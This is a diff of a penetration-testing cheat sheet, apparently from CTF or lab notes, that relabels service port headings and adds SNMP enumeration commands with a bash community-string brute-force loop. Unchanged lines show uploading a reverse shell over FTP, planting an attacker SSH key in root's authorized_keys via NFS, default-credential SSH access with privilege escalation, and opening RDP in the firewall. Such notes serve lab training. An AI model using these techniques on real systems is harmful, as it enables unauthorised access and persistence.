@@ -22,7 +22,7 @@ Kali Apache server not working properly? Try use:
 
 ## SERVICES
 
-__FTP (21)__
+__FTP (TCP 21)__
 
 Fingerprint / access FTP server:
 ```
@@ -41,31 +41,31 @@ ftp> get [ filename ]
 ftp> put reverse-shell.txt
 ```
 
-__SSH (22)__
+__SSH (TCP 22)__
 
 Fingerprint server/OS, SSH key.
 Basic auth-bypass (user=Patrick pass=Patrick) => Privesc `$ sudo su` + `$ su root`
 
 
 
-__HTTP (80|8080|443|8443 etc.)__
+__HTTP (TCP 80|8080|443|8443 etc.)__
 
 See section "WEB" for juicy web stuff.
 
 
 
-__Telnet (23)__
+__Telnet (TCP 23)__
 
 Stuff
 
 
 
-__SMTP (25)__
+__SMTP (TCP 25)__
 
 `$ snmp-check [ target ]`
 
 
-__DNS (53)__
+__DNS (TCP 53)__
 
 Changing nameserver to target IP, revealing additional domains / directories.
 ```
@@ -90,7 +90,7 @@ vpn.friendzoneportal.red. 604800 IN	A	127.0.0.1
 friendzoneportal.red.	604800	IN	SOA	localhost. root.localhost. 2 604800 86400 2419200 604800
 ```
 
-__Remote Procedure Call - RPC (111)__
+__Remote Procedure Call - RPC (TCP 111)__
 
 Exploit NFS shares
 ```
@@ -115,7 +115,7 @@ $ cat hacker_rsa.pub >> authorized_keys                     # add your public ke
 $ ssh -i /root/.ssh/hacker_rsa root@192.168.1.112           # SSH to target using your private key
 ```
 
-__SMB / NETBIOS / SMBD (135-139 - 445)__
+__SMB / NETBIOS / SMBD (TCP 135-139 - 445)__
 
 SMB enumeration
 ```bash
@@ -157,7 +157,7 @@ Working exploits:
 
 
 
-__SMBD / SAMBA (139)__
+__SMBD / SAMBA (TCP 139)__
 
 SMBD/Sambda is a server to provide SMB service to clients
 
@@ -166,15 +166,32 @@ Working exploits:
 
 
 
-__MSRPC (135)__
+__MSRPC (TCP 135)__
 * Stuff
 
+__SNMP (UDP 161)__
 
-__MySQL (3306)__
+SNMP enumeration:
+```
+$ snmpwalk -c [community string] -v1 [ target ]
+$ onesixtyone [ target ] -c community.txt
+```
+
+Snmpwalk brute-force script:
+```bash
+#!/bin/bash
+while read line; do
+    echo "Testing $line"; snmpwalk -c $line -v1 10.10.10.105
+done < community.txt
+```
+
+Community string wordlist: https://github.com/danielmiessler/SecLists/blob/master/Discovery/SNMP/common-snmp-community-strings.txt
+
+__MySQL (TCP 3306)__
 
 
 
-__RDP (3389)__
+__RDP (TCP 3389)__
 
 If you have credentials, you can enable the RDP service then log in:
 ```powershell
@@ -205,7 +222,7 @@ Remote Desktop service to allow RDP traffic. [UDP 3389]" enable=yes
 profile=private,domain localport=3389 protocol=udp
 ```
 
-__IRC (6660-6669, 6697, 67000)__
+__IRC (TCP 6660-6669, 6697, 67000)__
 
 IRC enum:
 * Start `hexchat` in Kali.
